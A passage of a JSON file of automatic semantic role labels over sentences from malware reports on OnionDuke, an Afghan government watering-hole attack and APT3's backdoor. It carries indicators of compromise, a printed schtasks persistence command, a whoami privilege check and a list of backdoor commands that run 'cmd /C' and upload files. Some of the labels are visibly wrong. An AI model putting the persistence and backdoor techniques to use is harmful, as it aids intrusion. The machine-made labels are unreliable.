"index": 25}, "ARG1": {"text": "the infection vector"}}}, " We have, for instance, observed components dedicated to stealing login credentials from\nthe victim machine and components dedicated to gathering further information on the compromised\nsystem like the presence of antivirus software or a firewall": {"have": {"V": {"text": "have", "index": 1}}, "dedicated": {"ARG1": {"text": "components"}, "V": {"text": "dedicated", "index": 8}, "ARG2": {"text": "to stealing login credentials from the victim machine and components dedicated to gathering further information on the compromised system"}}, "stealing": {"V": {"text": "stealing", "index": 10}, "ARG1": {"text": "login credentials"}, "ARG2": {"text": "from the victim machine and components"}}, "gathering": {"V": {"text": "gathering", "index": 21}, "ARG1": {"text": "further information on the compromised system"}, "ARGM-MNR": {"text": "like the presence of antivirus software or a firewall"}}, "compromised": {"V": {"text": "compromised", "index": 26}, "ARG1": {"text": "system"}}}, "\nWe also have evidence suggesting that, at least since February of 2014, OnionDuke has not only been\nspread by modifying downloaded executables but also by infecting executables in .torrent files containing\npirated software": {"have": {"ARG0": {"text": "We"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "have", "index": 2}, "ARG1": {"text": "evidence suggesting that , at least since February of 2014 , OnionDuke has not only been spread by modifying downloaded executables but also by infecting executables in .torrent files containing pirated software"}}, "suggesting": {"ARG0": {"text": "evidence"}, "V": {"text": "suggesting", "index": 4}, "ARG1": {"text": "that , at least since February of 2014 , OnionDuke has not only been spread by modifying downloaded executables but also by infecting executables in .torrent files containing pirated software"}}, "has": {"V": {"text": "has", "index": 15}}, "been": {"V": {"text": "been", "index": 18}}, "spread": {"ARGM-TMP": {"text": "at least since February of 2014"}, "ARG1": {"text": "OnionDuke"}, "V": {"text": "spread", "index": 19}, "ARG0": {"text": "by modifying downloaded executables"}, "ARGM-MNR": {"text": "by infecting executables in"}}, "modifying": {"V": {"text": "modifying", "index": 21}, "ARG1": {"text": "downloaded executables"}}, "downloaded": {"V": {"text": "downloaded", "index": 22}, "ARG1": {"text": "executables"}}, "infecting": {"ARG0": {"text": "OnionDuke"}, "V": {"text": "infecting", "index": 27}, "ARG1": {"text": "executables"}}, "containing": {"ARG0": {"text": "executables in .torrent files"}, "V": {"text": "containing", "index": 32}, "ARG1": {"text": "pirated software"}}, "pirated": {"V": {"text": "pirated", "index": 33}, "ARG1": {"text": "software"}}}, " The dropper will proceed to decrypt this DLL, write it to disk and\nexecute it": {"will": {"V": {"text": "will", "index": 2}}, "proceed": {"ARG0": {"text": "The dropper"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "proceed", "index": 3}, "ARG1": {"text": "to decrypt this DLL"}}, "decrypt": {"V": {"text": "decrypt", "index": 5}, "ARG1": {"text": "this DLL"}}, "write": {"ARG0": {"text": "The dropper"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "write", "index": 9}, "ARG1": {"text": "it"}, "ARG2": {"text": "to disk"}}, "disk": {"ARG0": {"text": "it"}, "V": {"text": "disk", "index": 12}, "ARG1": {"text": "it"}}, "execute": {"ARG0": {"text": "The dropper"}, "V": {"text": "execute", "index": 14}, "ARG1": {"text": "it"}}}, " By using a separate wrapper, the malicious actors are able to bypass any integrity checks the\noriginal binary might contain": {"using": {"V": {"text": "using", "index": 1}, "ARG1": {"text": "a separate wrapper"}, "ARG0": {"text": "the malicious actors"}}, "are": {"ARGM-MNR": {"text": "By using a separate wrapper"}, "ARG1": {"text": "the malicious actors"}, "V": {"text": "are", "index": 9}, "ARG2": {"text": "able to bypass any integrity checks the original binary might contain"}}, "bypass": {"ARG0": {"text": "the malicious actors"}, "V": {"text": "bypass", "index": 12}, "ARG1": {"text": "any integrity checks the original binary might contain"}}, "checks": {"V": {"text": "checks", "index": 15}, "ARG1": {"text": "the original binary"}}, "might": {"ARG1": {"text": "the original binary"}, "V": {"text": "might", "index": 19}}, "contain": {"ARG1": {"text": "any integrity"}, "ARG0": {"text": "the"}, "ARGM-MOD": {"text": "might"}, "V": {"text": "contain", "index": 20}}}, "<doc>\n<section>\n<heading>OnionDuke: APT Attacks Via the Tor Network - F-Secure Weblog :\nNews from the Lab</heading>\nRecently, research was published identifying a Tor exit node, located in Russia, that was consistently and\nmaliciously modifying any uncompressed Windows executables downloaded through it": {"was": {"V": {"text": "was", "index": 3}}, "published": {"ARGM-TMP": {"text": "Recently"}, "ARG1": {"text": "research"}, "V": {"text": "published", "index": 4}, "C-ARG1": {"text": "identifying a Tor exit node , located in Russia , that was consistently and maliciously modifying"}, "ARGM-PRD": {"text": "any uncompressed Windows executables downloaded through it"}}, "identifying": {"ARG0": {"text": "published"}, "V": {"text": "identifying", "index": 5}, "ARG1": {"text": "a Tor exit node , located in Russia , that was consistently and maliciously modifying any uncompressed Windows executables downloaded through it"}}, "located": {"ARG1": {"text": "a Tor exit node"}, "V": {"text": "located", "index": 11}, "ARGM-LOC": {"text": "in Russia"}}, "was_2": {"V": {"text": "was", "index": 16}}, "modifying": {"ARG0": {"text": "a Tor exit node"}, "R-ARG2": {"text": "that"}, "ARGM-MNR": {"text": "consistently and maliciously"}, "V": {"text": "modifying", "index": 20}, "ARG1": {"text": "any uncompressed Windows executables downloaded through it"}}, "downloaded": {"ARG1": {"text": "any uncompressed Windows executables"}, "V": {"text": "downloaded", "index": 25}, "ARGM-MNR": {"text": "through it"}}}, " This DLL file (SHA1\nd433f281cf56015941a1c2cb87066ca62ea1db37, detected as Backdoor:W32/OnionDuke.A) contains\namong its configuration data a different hardcoded C&C domain, overpict.com and also evidence\nsuggesting that this component may abuse Twitter as an additional C&C channel": {"detected": {"V": {"text": "detected", "index": 7}, "ARGM-MNR": {"text": "as Backdoor"}}, "contains": {"ARG0": {"text": "W32/OnionDuke/ A )"}, "V": {"text": "contains", "index": 15}, "ARGM-LOC": {"text": "among its configuration data"}, "ARG1": {"text": "a different hardcoded C&C domain"}}, "hardcoded": {"ARGM-EXT": {"text": "different"}, "V": {"text": "hardcoded", "index": 22}, "ARG1": {"text": "C&C domain"}}, "suggesting": {"V": {"text": "suggesting", "index": 30}, "ARG1": {"text": "that this component may abuse Twitter as an additional C&C channel"}}, "may": {"ARG0": {"text": "this component"}, "V": {"text": "may", "index": 34}, "ARG1": {"text": "abuse Twitter"}, "ARGM-PRD": {"text": "as an additional C&C channel"}}, "abuse": {"ARG0": {"text": "this component"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "abuse", "index": 35}, "ARG1": {"text": "Twitter"}, "ARGM-PRD": {"text": "as an additional C&C channel"}}}, " From these C&Cs the malware may\nreceive instructions to download and execute additional malicious components": {"may": {"V": {"text": "may", "index": 5}}, "receive": {"ARGM-DIR": {"text": "From these C&Cs"}, "ARG0": {"text": "the malware"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "receive", "index": 6}, "ARG1": {"text": "instructions to download and execute additional malicious components"}}, "download": {"ARG0": {"text": "the malware"}, "V": {"text": "download", "index": 9}, "ARG1": {"text": "additional malicious components"}}, "execute": {"ARG0": {"text": "the malware"}, "V": {"text": "execute", "index": 11}, "ARG1": {"text": "additional malicious components"}}}, " This executable is a dropper containing a PE\nresource that pretends to be an embedded GIF image file": {"is": {"ARG1": {"text": "This executable"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a dropper containing a PE resource that pretends to be an embedded GIF image file"}}, "containing": {"ARG0": {"text": "a dropper"}, "V": {"text": "containing", "index": 5}, "ARG1": {"text": "a PE resource that pretends to be an embedded GIF image file"}}, "pretends": {"ARG0": {"text": "a PE resource"}, "R-ARG0": {"text": "that"}, "V": {"text": "pretends", "index": 10}, "ARG1": {"text": "to be an embedded GIF image file"}}, "be": {"ARG1": {"text": "that"}, "V": {"text": "be", "index": 12}, "ARG2": {"text": "an embedded GIF image file"}}, "embedded": {"V": {"text": "embedded", "index": 14}, "ARG1": {"text": "GIF image file"}}}, "\n\f\n\n<figure></figure>\n\n<caption>A flowchart of the infection process</caption>\n\n\nOnce executed, the DLL file (SHA1: b491c14d8cfb48636f6095b7b16555e9a575d57f, detected as\nBackdoor:W32/OnionDuke.B) will decrypt an embedded configuration (shown below) and attempt to\nconnect to hardcoded C&C URLs specified in the configuration data": {"executed": {"ARGM-TMP": {"text": "Once"}, "V": {"text": "executed", "index": 1}}, "detected": {"ARG1": {"text": "b491c14d8cfb48636f6095b7b16555e9a575d57f"}, "V": {"text": "detected", "index": 11}, "ARGM-ADV": {"text": "as Backdoor"}}, "will": {"V": {"text": "will", "index": 19}}, "decrypt": {"ARG0": {"text": "W32/OnionDuke . B )"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "decrypt", "index": 20}, "ARG1": {"text": "an embedded configuration ( shown below )"}}, "embedded": {"V": {"text": "embedded", "index": 22}, "ARG1": {"text": "configuration"}}, "shown": {"ARG1": {"text": "an"}, "V": {"text": "shown", "index": 25}, "ARGM-LOC": {"text": "below )"}}, "attempt": {"ARG0": {"text": "W32/OnionDuke . B )"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "attempt", "index": 29}, "ARG1": {"text": "to connect to hardcoded C&C URLs specified in the configuration data"}}, "connect": {"V": {"text": "connect", "index": 31}, "ARG1": {"text": "to hardcoded C&C URLs specified in the configuration data"}}, "hardcoded": {"V": {"text": "hardcoded", "index": 33}, "ARG1": {"text": "C&C URLs specified in the configuration data"}}, "specified": {"ARG1": {"text": "hardcoded C&C URLs"}, "V": {"text": "specified", "index": 36}, "ARGM-LOC": {"text": "in the configuration data"}}}, "\n\nBy exploiting and co-opting Afghan network infrastructure that is used by multiple ministerial level\nwebsites, Chinese intelligence services would be able to widely distribute malicious payloads to a variety of\nglobal targets using Afghanistan\u2019s government websites as a topical and trusted distribution platform,\nexploiting a single hidden entry point": {"exploiting": {"V": {"text": "exploiting", "index": 1}, "ARG1": {"text": "Afghan network infrastructure"}}, "is": {"V": {"text": "is", "index": 10}}, "used": {"ARG1": {"text": "exploiting and co - opting Afghan network infrastructure"}, "R-ARG1": {"text": "that"}, "V": {"text": "used", "index": 11}, "ARG0": {"text": "by multiple ministerial level websites"}}, "would": {"V": {"text": "would", "index": 21}}, "be": {"ARGM-MNR": {"text": "By exploiting and co - opting Afghan network infrastructure that is used by multiple ministerial level websites"}, "ARG1": {"text": "Chinese intelligence services"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "be", "index": 22}, "ARG2": {"text": "able to widely distribute malicious payloads to a variety of global targets using Afghanistan \u2019s government websites as a topical and trusted distribution platform"}, "ARGM-ADV": {"text": "exploiting a single hidden entry point"}}, "distribute": {"ARG0": {"text": "Chinese intelligence services"}, "ARGM-MNR": {"text": "widely/ using Afghanistan \u2019s government websites as a topical and trusted distribution platform"}, "V": {"text": "distribute", "index": 26}, "ARG1": {"text": "malicious payloads"}, "ARG2": {"text": "to a variety of global targets"}}, "using": {"V": {"text": "using", "index": 35}, "ARG1": {"text": "Afghanistan \u2019s government websites"}, "ARG2": {"text": "as a topical and trusted distribution platform"}}, "exploiting_2": {"ARG0": {"text": "Chinese intelligence services"}, "V": {"text": "exploiting", "index": 48}, "ARG1": {"text": "a single hidden entry point"}}}, " This being a variant of a typical \u201cwatering-hole\u201d attack, the\nattackers will most likely infect victims outside the Afghan government who happened to be browsing any\none of the CDN client systems, specifically, partner states involved in the planned troop reduction": {"being": {"ARG1": {"text": "This"}, "V": {"text": "being", "index": 1}, "ARG2": {"text": "a variant of a typical \u201c watering - hole \u201d attack"}}, "will": {"ARGM-ADV": {"text": "This being a variant of a typical \u201c watering - hole \u201d attack/ most likely"}, "ARG1": {"text": "the attackers"}, "V": {"text": "will", "index": 16}, "ARGM-LOC": {"text": "infect victims/ outside the Afghan government who happened to be browsing any one of the CDN client systems , specifically , partner states involved in the planned troop reduction"}}, "infect": {"ARG0": {"text": "the attackers"}, "ARGM-MOD": {"text": "will"}, "ARGM-ADV": {"text": "most likely"}, "V": {"text": "infect", "index": 19}, "ARG1": {"text": "victims"}, "ARGM-LOC": {"text": "outside the Afghan government who happened to be browsing any one of the CDN client systems , specifically , partner states involved in the planned troop reduction"}}, "happened": {"V": {"text": "happened", "index": 26}, "ARG1": {"text": "to be browsing any one of the CDN client systems , specifically , partner states involved in the planned troop reduction"}}, "be": {"V": {"text": "be", "index": 28}}, "browsing": {"ARG0": {"text": "who"}, "V": {"text": "browsing", "index": 29}, "ARG1": {"text": "any one of the CDN client systems , specifically , partner states involved in the planned troop reduction"}}, "involved": {"ARG1": {"text": "partner states"}, "V": {"text": "involved", "index": 42}, "ARG2": {"text": "in the planned troop reduction"}}}, " Additional indicators and context associated with this particular Java driveby\nactivity can be found in the ThreatConnect Common Community Incident 20140815A: \n<list>\njava-se APT\nDriveby (shared October 02, 2014)\n</list>\n</section>\n<section>\n<heading>The Windows PE Payload</heading>\n\nThe XOR 0xC8 encoded payload downloaded from [http:]//mfa.gov[.]af/content/images/icon35.png\ndecodes into the Windows PE executable SHA1: \n<list>\n72D72DC1BBA4C5EBC3D6E02F7B446114A3C58EAB\n</list>\nThis executable is a self-extracting (SFX) Microsoft Cabinet executable that is digitally signed with a valid\ncertificate from \u201cOnAndOn Information System Co., Ltd.\u201d, serial number \u201c1F F7 D8 64 18 1C 55 5E 70 CF\nDD 3A 59 34 C4 7D\u201d": {"associated": {"ARG1": {"text": "Additional indicators and context"}, "V": {"text": "associated", "index": 4}, "ARG2": {"text": "with this particular Java driveby activity"}}, "can": {"V": {"text": "can", "index": 11}}, "be": {"V": {"text": "be", "index": 12}}, "found": {"ARG1": {"text": "Additional indicators and context associated with this particular Java driveby activity"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "found", "index": 13}, "ARGM-LOC": {"text": "in the ThreatConnect Common Community Incident 20140815A"}}, "is": {"ARG1": {"text": "This executable"}, "V": {"text": "is", "index": 24}, "ARG2": {"text": "a self - extracting ( SFX ) Microsoft Cabinet executable that is digitally signed with a valid certificate from \u201c OnAndOn Information System Co. , Ltd. \u201d , serial number \u201c 1F F7 D8 64 18 1C 55 5E 70 CF DD 3A 59 34 C4 7D \u201d"}}, "extracting": {"ARGM-MNR": {"text": "self"}, "V": {"text": "extracting", "index": 28}, "ARG1": {"text": "( SFX"}}, "is_2": {"V": {"text": "is", "index": 36}}, "signed": {"ARG1": {"text": "a self - extracting ( SFX ) Microsoft Cabinet executable"}, "R-ARG1": {"text": "that"}, "V": {"text": "signed", "index": 38}, "ARG2": {"text": "with a valid certificate/ from \u201c OnAndOn Information System Co. , Ltd. \u201d , serial number \u201c 1F F7 D8 64 18 1C 55 5E 70 CF DD 3A 59 34 C4 7D \u201d"}}}, "\n</section>\n<section>\n<heading>Afghan Government \u201cWatering Hole\u201d</heading>\n\nThe ThreatConnect Intelligence Research Team (TCIRT) recently observed a targeted cross-site scripting\n(XSS) \u201cdrive-by\u201d attack that leveraged a single content delivery network resource to distribute a malicious\nJava applet via nearly all of the major official Government of Afghanistan websites": {"observed": {"ARG0": {"text": "The ThreatConnect Intelligence Research Team ( TCIRT )"}, "ARGM-TMP": {"text": "recently"}, "V": {"text": "observed", "index": 9}, "ARG1": {"text": "a targeted cross - site scripting ( XSS ) \u201c drive - by \u201d attack that leveraged a single content delivery network resource to distribute a malicious Java applet via nearly all of the major official Government of Afghanistan websites"}}, "targeted": {"V": {"text": "targeted", "index": 11}, "ARG1": {"text": "cross - site scripting"}}, "drive": {"ARGM-ADJ": {"text": "\u201c"}, "V": {"text": "drive", "index": 20}}, "leveraged": {"ARG0": {"text": "\u201d attack"}, "R-ARG0": {"text": "that"}, "V": {"text": "leveraged", "index": 26}, "ARG1": {"text": "a single content delivery network resource"}, "ARGM-PRP": {"text": "to distribute a malicious Java applet"}, "ARGM-MNR": {"text": "via nearly all of the major official Government of Afghanistan websites"}}, "distribute": {"V": {"text": "distribute", "index": 34}, "ARG1": {"text": "a malicious Java applet"}, "ARGM-MNR": {"text": "via nearly all of the major official Government of Afghanistan websites"}}}, " This\nclass file downloads and decodes an XOR 0xC8 encoded Windows PE executable payload from\n[http:]//mfa.gov[.]af/content/images/icon35.png, hosted on the official Afghan Ministry of Foreign\nAffairs site, which was also affected by the gop-script XSS": {"decodes": {"ARG0": {"text": "This class file"}, "V": {"text": "decodes", "index": 5}, "ARG1": {"text": "an XOR 0xC8 encoded Windows PE"}}, "encoded": {"V": {"text": "encoded", "index": 9}, "ARG1": {"text": "Windows PE"}}, "executable": {"ARG0": {"text": "an XOR 0xC8 encoded Windows PE"}, "V": {"text": "executable", "index": 12}, "ARG1": {"text": "payload"}, "ARG2": {"text": "from [ http:]//mfa.gov[.]af"}}, "hosted": {"V": {"text": "hosted", "index": 24}, "ARGM-LOC": {"text": "on the official Afghan Ministry of Foreign Affairs site , which was also affected by the gop - script XSS"}}, "was": {"V": {"text": "was", "index": 36}}, "affected": {"ARG1": {"text": "the official Afghan Ministry of Foreign Affairs site"}, "R-ARG1": {"text": "which"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "affected", "index": 38}, "ARG0": {"text": "by the gop - script XSS"}}}, "\n<list>\n      SHA1: 5C8683E3523C7FA81A0166D7D127616B06334E8D (Readme.txt)\nMalicious encrypted backdoor binary blob loaded by dbgeng.dll\n</list>\n\fThis backdoor connects to the faux Oracle Java themed command and control (C2) domain\noracle0876634.javaplug-in[.]com": {"themed": {"V": {"text": "themed", "index": 8}, "ARG1": {"text": "command"}}}, " This applet has the same class path, and\ndownloads an XOR 0xFF encoded payload executable from the URL [https:]//amco-\ntriton.co[.]jp/js/dl/in.jpg": {"has": {"ARG0": {"text": "This applet"}, "V": {"text": "has", "index": 2}, "ARG1": {"text": "the same class path"}}, "downloads": {"ARG0": {"text": "This applet"}, "V": {"text": "downloads", "index": 9}, "ARG1": {"text": "an XOR 0xFF encoded payload executable from the URL [ https:]//amco- triton.co[.]jp/js/dl/in.jpg"}}, "encoded": {"ARG0": {"text": "an XOR 0xFF"}, "V": {"text": "encoded", "index": 13}, "ARG1": {"text": "payload executable"}}}, "\n\nThis executable drops the following files:\n<list>\n      SHA1: 2068260601D60F07829EE0CEDF5A9C636CDB1765 (dllhost.exe)\nLegitimate Microsoft Debugging Tools for Windows Executable, loads dbgeng.dll\n      SHA1: E2D93ABC4C5EDE41CAF1C0D751A329B884D732A2 (dbgeng.dll)\n</list>\nMalicious DLL that loads into the above dllhost.exe, using a similar DLL sideloading technique to that\nmost commonly associated with the PlugX backdoor": {"drops": {"ARG0": {"text": "This executable"}, "V": {"text": "drops", "index": 2}, "ARG1": {"text": "the following files : Malicious DLL that loads into the above dllhost.exe , using a similar DLL sideloading technique to that most commonly associated with the PlugX backdoor"}}, "following": {"V": {"text": "following", "index": 4}, "ARG1": {"text": "files"}}, "loads": {"ARG2": {"text": "Malicious DLL"}, "R-ARG2": {"text": "that"}, "V": {"text": "loads", "index": 10}, "ARG1": {"text": "into the above dllhost.exe"}, "ARGM-MNR": {"text": "using a similar DLL sideloading technique to that most commonly associated with the PlugX backdoor"}}, "using": {"V": {"text": "using", "index": 16}, "ARG1": {"text": "a similar DLL sideloading technique"}, "ARG2": {"text": "to that most commonly associated with the PlugX backdoor"}}, "associated": {"ARG1": {"text": "that"}, "ARGM-ADV": {"text": "most commonly"}, "V": {"text": "associated", "index": 26}, "ARG2": {"text": "with the PlugX backdoor"}}}, " The deflated exe was a variant of the same downloader described above and\nconnected to 198.55.115.71 over port 1913 via SOCKS5 proxy": {"was": {"ARG1": {"text": "The deflated exe"}, "V": {"text": "was", "index": 3}, "ARG2": {"text": "a variant of the same downloader described above and connected to 198.55.115.71 over port 1913 via SOCKS5 proxy"}}, "described": {"ARG1": {"text": "the same downloader"}, "V": {"text": "described", "index": 10}, "ARGM-LOC": {"text": "above"}}, "connected": {"ARG1": {"text": "the same downloader"}, "V": {"text": "connected", "index": 13}, "ARG2": {"text": "to 198.55.115.71"}, "ARGM-MNR": {"text": "over port 1913 via SOCKS5 proxy"}}}, " The malware then requests a connection to 192.184.60.229 on TCP port 81 using the\ncommand \"05 01 00 01 c0 b8 3c e5 00 51\" and verifies that the first two bytes from the server are \"05 00\"\n(c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order)": {"requests": {"ARG0": {"text": "The malware"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "requests", "index": 3}, "ARG1": {"text": "a connection to 192.184.60.229 on TCP port 81 using the command \" 05 01 00 01 c0 b8 3c e5 00 51 \" and verifies"}}, "using": {"V": {"text": "using", "index": 12}, "ARG1": {"text": "the command \" 05 01 00 01 c0 b8 3c e5 00 51 \" and verifies"}}, "are": {"ARG1": {"text": "the first two bytes from the server"}, "V": {"text": "are", "index": 37}, "ARG2": {"text": "( c0"}}, "is": {"ARG1": {"text": "( c0 b8 3c e5"}, "V": {"text": "is", "index": 47}, "ARG2": {"text": "the IP address"}}, "is_2": {"ARG1": {"text": "00 51"}, "V": {"text": "is", "index": 54}, "ARG2": {"text": "the port"}}}, "\n\nThe malware component, test.exe, uses the Windows command \"cmd.exe\" /C whoami\u201d to verify it is\nrunning with the elevated privileges of \u201cSystem\u201d and creates persistence by creating the following\nscheduled task:\n<list>\n  schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON         /ru \"System\"\n</list>\nWhen executed, the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port\n1913": {"uses": {"ARG0": {"text": "The malware component , test.exe ,"}, "V": {"text": "uses", "index": 6}, "ARG1": {"text": "the Windows command \" cmd.exe \" /C whoami \u201d"}, "ARG2": {"text": "to verify it is running with the elevated privileges of \u201c System \u201d"}}, "verify": {"ARG0": {"text": "The malware component , test.exe ,"}, "V": {"text": "verify", "index": 17}, "ARG1": {"text": "it/ running with the elevated privileges of \u201c System \u201d"}}, "is": {"V": {"text": "is", "index": 19}}, "running": {"ARG0": {"text": "it"}, "V": {"text": "running", "index": 20}, "ARG1": {"text": "with the elevated privileges of \u201c"}, "ARGM-MNR": {"text": "System \u201d"}}, "creates": {"ARG0": {"text": "The malware component , test.exe"}, "V": {"text": "creates", "index": 30}, "ARG1": {"text": "persistence"}, "ARGM-MNR": {"text": "by creating the following scheduled task"}}, "creating": {"ARG0": {"text": "The malware component , test.exe"}, "V": {"text": "creating", "index": 33}, "ARG1": {"text": "the following scheduled task"}}, "following": {"V": {"text": "following", "index": 35}, "ARG1": {"text": "scheduled task"}}, "executed": {"ARGM-TMP": {"text": "When"}, "V": {"text": "executed", "index": 40}}, "establishes": {"ARGM-TMP": {"text": "When executed ,/ first"}, "ARG0": {"text": "the malware"}, "V": {"text": "establishes", "index": 45}, "ARG1": {"text": "a SOCKS5 connection to 192.157.198.103"}, "ARGM-ADV": {"text": "using TCP port 1913"}}, "using": {"V": {"text": "using", "index": 51}, "ARG1": {"text": "TCP port 1913"}}}, " The secondary payload in that case was\ndetected as Backdoor.APT.CookieCutter (aka Pirpi) and also named newnotepad.exe (MD5\n8849538ef1c3471640230605c2623c67) and connected to the known APT3 domains:\n<list>\n  inform.bedircati[.]com\n\n  pn.lamb-site[.]com\n\n  210.109.99.64\n</list>\n\fThe 192.184.60.229 IP address seen in this current campaign also hosts securitywap[.]com \u2013 another\nknown domain referenced in our Operation Clandestine Fox blog": {"was": {"V": {"text": "was", "index": 6}}, "detected": {"ARG1": {"text": "The secondary payload in that case"}, "V": {"text": "detected", "index": 7}, "ARGM-ADV": {"text": "as Backdoor . APT.CookieCutter ( aka Pirpi )"}}, "named": {"ARGM-ADV": {"text": "also"}, "V": {"text": "named", "index": 18}, "ARG1": {"text": "newnotepad.exe"}, "ARG2": {"text": "( MD5 8849538ef1c3471640230605c2623c67 ) and"}}, "connected": {"ARG1": {"text": "newnotepad.exe ( MD5 8849538ef1c3471640230605c2623c67"}, "V": {"text": "connected", "index": 25}, "ARG2": {"text": "to the known APT3 domains"}}, "known": {"V": {"text": "known", "index": 28}, "ARG1": {"text": "APT3 domains"}}, "seen": {"ARG1": {"text": "The 192.184.60.229 IP address"}, "V": {"text": "seen", "index": 36}, "ARGM-LOC": {"text": "in this current campaign"}}, "hosts": {"ARG0": {"text": "The 192.184.60.229 IP address seen in this current campaign"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "hosts", "index": 42}, "ARG1": {"text": "securitywap[.]com \u2013 another known domain referenced"}, "ARGM-LOC": {"text": "in our Operation Clandestine Fox blog"}}, "known_2": {"V": {"text": "known", "index": 46}, "ARG1": {"text": "domain referenced"}}, "referenced": {"ARG1": {"text": "another known domain"}, "V": {"text": "referenced", "index": 48}, "ARGM-LOC": {"text": "in our Operation Clandestine Fox blog"}}}, "\n</section>\n<section>\n<heading>The Downloader</heading>\n\nAfter the exploit or script executes, the system downloads install.exe, which has the following metadata:\n<list>\nMD5           5a0c4e1925c76a959ab0588f683ab437\n\nSize         46592 bytes\n\nCompile Time 2014-11-19 08:55:10Z\n\nImport Hash      6b8611f8148a6b51e37fd68e75b6a81c\n</list>\nThe file install.exe attempts to write two files (doc.exe and test.exe) to the hard-coded path\n\u201cC:\\Users\\Public\u201d, which fails on Windows XP because that path is not present by default": {"attempts": {"ARG0": {"text": "The file install.exe"}, "V": {"text": "attempts", "index": 3}, "ARG1": {"text": "to write two files ( doc.exe and test.exe ) to the hard - coded path \u201c C:\\Users\\Public \u201d , which fails on Windows XP because that path is not present by default"}}, "write": {"ARG0": {"text": "The file install.exe"}, "V": {"text": "write", "index": 5}, "ARG1": {"text": "two files ( doc.exe and test.exe ) to"}}, "coded": {"ARGM-MNR": {"text": "hard"}, "V": {"text": "coded", "index": 17}, "ARG1": {"text": "path"}}, "fails": {"R-ARG1": {"text": "which"}, "V": {"text": "fails", "index": 24}, "ARG2": {"text": "on Windows XP"}, "ARGM-CAU": {"text": "because that path is not present by default"}}, "is": {"ARG1": {"text": "path"}, "V": {"text": "is", "index": 31}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "present by default"}}}, "<doc>\n<section>\n<heading>Operation Double Tap</heading>\n\nAPT3 (also known as UPS), the actors responsible for Operation Clandestine Fox has quietly continued to\nsend waves of spearphishing messages over the past few months": {"known": {"ARG1": {"text": "APT3 ("}, "ARGM-DIS": {"text": "also"}, "V": {"text": "known", "index": 3}, "ARG2": {"text": "as UPS )"}}, "has": {"V": {"text": "has", "index": 15}}, "continued": {"ARGM-MNR": {"text": "quietly"}, "V": {"text": "continued", "index": 17}, "ARG1": {"text": "to send waves of spearphishing messages over the past few months"}}, "send": {"ARG0": {"text": "the actors responsible for Operation Clandestine Fox"}, "V": {"text": "send", "index": 19}, "ARG1": {"text": "waves of spearphishing messages"}, "ARGM-TMP": {"text": "over the past few months"}}, "spearphishing": {"V": {"text": "spearphishing", "index": 22}, "ARG1": {"text": "messages"}}}, " The file is saved to:\n\n               C:\\Users\\\n               [Username]\\AppData\\Local\\Temp\\notepad.exe\n 00 00 04      Content after command ID is written to:\n\n               C:\\Users\\\n               [Username]\\AppData\\Local\\Temp\\notepad2.exe\n 00 00 05      The files notepad1.exe and notepad2.exe are\n               concatenated together and written to C:\\Users\\\n               [Username]\\AppData\\Local\\Temp\\newnotepad.exe\n               and executed\n 00 00 06      The contents of the following file is sent to the\n               server:\n\n               C:\\Users\\\n               [Username]\\AppData\\Local\\Temp\\note.txt\n 00 00 07      The string following the command ID is executed\n               using \"cmd /C\" and results are sent to server\n</table>\n</section>\n<section>\n<heading>Links to APT3</heading>\n\nOn October 28, we observed APT3 sending out spearphishing messages containing a compressed\nexecutable attachment": {"is": {"V": {"text": "is", "index": 2}}, "saved": {"ARG1": {"text": "The file"}, "V": {"text": "saved", "index": 3}, "ARG2": {"text": "to"}}, "is_2": {"V": {"text": "is", "index": 16}}, "written": {"ARG1": {"text": "command ID"}, "V": {"text": "written", "index": 17}, "ARGM-PRP": {"text": "to"}}, "are": {"ARG1": {"text": "notepad2.exe"}, "V": {"text": "are", "index": 31}, "ARG2": {"text": "concatenated"}}, "concatenated": {"ARG1": {"text": "notepad2.exe"}, "V": {"text": "concatenated", "index": 32}, "ARGM-PRD": {"text": "together"}}, "written_2": {"V": {"text": "written", "index": 35}, "ARG4": {"text": "to C:\\Users\\ ["}}, "executed": {"V": {"text": "executed", "index": 41}, "ARGM-MNR": {"text": "00 00 06"}, "ARGM-TMP": {"text": "The contents of the following file/ to the server"}}, "is_3": {"V": {"text": "is", "index": 51}}, "sent": {"ARG1": {"text": "The contents of the following file"}, "V": {"text": "sent", "index": 52}, "ARG2": {"text": "to the server"}}, "Username]\\AppData\\Local\\Temp\\note.txt": {"ARG0": {"text": "C:\\Users\\/ \" cmd"}, "V": {"text": "Username]\\AppData\\Local\\Temp\\note.txt 00", "index": 59}, "ARG1": {"text": "The string"}}, "following": {"V": {"text": "following", "index": 65}, "ARG2": {"text": "the command ID is executed using \" /C \" and results are sent to server On October 28"}}, "is_4": {"V": {"text": "is", "index": 69}}, "executed_2": {"ARGM-MNR": {"text": "00 00 04/ using \" cmd /C \" and"}, "ARG1": {"text": "the command ID"}, "V": {"text": "executed", "index": 70}}, "using": {"V": {"text": "using", "index": 71}}, "cmd": {"V": {"text": "cmd", "index": 73}}, "are_2": {"V": {"text": "are", "index": 78}}, "sent_2": {"ARG1": {"text": "results"}, "V": {"text": "sent", "index": 79}, "ARG2": {"text": "to server"}, "ARGM-TMP": {"text": "On October 28"}}, "server": {"V": {"text": "server", "index": 81}}, "observed": {"ARG0": {"text": "we"}, "V": {"text": "observed", "index": 87}, "ARG1": {"text": "APT3 sending out spearphishing messages containing a compressed executable attachment"}}, "sending": {"ARG0": {"text": "we"}, "V": {"text": "sending", "index": 89}, "ARGM-DIR": {"text": "out"}, "ARG1": {"text": "spearphishing messages containing a compressed executable attachment"}}, "spearphishing": {"V": {"text": "spearphishing", "index": 91}, "ARG1": {"text": "messages containing"}}, "containing": {"ARG0": {"text": "APT3/ spearphishing messages"}, "V": {"text": "containing", "index": 93}, "ARG1": {"text": "a compressed executable attachment"}}}, " The malware sends the 